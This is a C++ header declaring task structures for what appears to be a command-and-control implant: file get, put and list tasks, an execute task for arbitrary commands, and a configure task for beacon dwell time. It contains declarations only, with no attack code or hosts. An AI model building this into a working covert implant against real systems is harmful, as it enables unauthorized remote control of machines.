/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 */
#pragma once
#include "results.h"
#include <boost/property_tree/ptree.hpp>
#include <boost/uuid/uuid.hpp>
#include <cstdint>
#include <string>
#include <string_view>
#include <variant>
#include <functional>

struct GetTask {
  constexpr static std::string_view key{"get"};
  GetTask(const boost::uuids::uuid &id, std::string path);
  [[nodiscard]] Result run() const;
  const boost::uuids::uuid id;
private:
  const std::string path;
};

struct PutTask {
  constexpr static std::string_view key{"put"};
  PutTask(const boost::uuids::uuid &id, std::string path, std::string contents);
  [[nodiscard]] Result run() const;
  const boost::uuids::uuid id;
private:
  const std::string path;
  const std::string contents;
};

struct ListTask {
  constexpr static std::string_view key{"list"};
  ListTask(const boost::uuids::uuid &id, std::string path, uint8_t depth);
  [[nodiscard]] Result run() const;
  const boost::uuids::uuid id;
private:
  const std::string path;
  const uint8_t depth;
};

struct ExecuteTask {
  constexpr static std::string_view key{"execute"};
  ExecuteTask(const boost::uuids::uuid &id, std::string command);
  [[nodiscard]] Result run() const;
  const boost::uuids::uuid id;
private:
  const std::string command;
};

struct Configuration{
  Configuration(const double meanDwell, const bool isRunning);
  const double mean_dwell;
  const bool is_running;
};

struct ConfigureTask {
  constexpr static std::string_view key{"configure"};
  ConfigureTask(const boost::uuids::uuid &id, double mean_dwell,
                bool is_running, std::function<void(const Configuration&)> setter);
  [[nodiscard]] Result run() const;
  const boost::uuids::uuid id;
private:
  std::function<void(const Configuration&)> setter;
  const double mean_dwell;
  const bool is_running;
};

using Task =
std::variant<GetTask, PutTask, ListTask, ExecuteTask, ConfigureTask>;

[[nodiscard]] Task parse_task_from(const boost::property_tree::ptree &task_tree, std::function<void(const Configuration&)> setter);
